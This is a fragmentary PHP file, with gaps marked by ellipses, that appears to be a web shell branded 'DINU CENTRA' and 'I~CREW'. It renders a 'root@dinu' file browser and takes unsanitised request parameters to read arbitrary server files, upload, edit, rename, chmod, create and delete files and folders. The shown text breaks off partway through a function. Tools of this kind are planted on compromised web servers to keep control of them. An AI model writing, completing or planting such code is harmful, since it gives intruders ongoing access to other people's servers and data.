...
echo '</head>
<body><b>
<H1><center> &lt;/&gt; <font color="red">DINU CENTRA</font> <font color="red">- I~CREW
</font></center></h1>
...
if($pat == '' && $id == 0){
$a = true;		
echo '<font color=#fff><center>$ root@dinu : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
echo '<font color="red">File Upload</font><br />';
}else{
...
echo(' <textarea style="width: 100%;height: 450px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}
//Empety
...
echo '<font color="ree">Change Permission Done </font><br />';
}else{
...
echo '<font color="red">Change Name Done </font><br />';
}else{
...
echo '<font color="red">Create File Done [ '.$new.' ]</font><br />';
}else{
...
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="red">Edit File Done </font><br />';
}else{
...
if(rmdir($patc)){
echo '<font color="red">Delete File Done</font><br />';
}else{
...
echo '<font color="red">Create Folder Done </font><br />';
}
}
//Delete file
...
echo '<br><center><br>&lt;/&gt; #I~CREW</b></body>
</html>';
function perms($file){
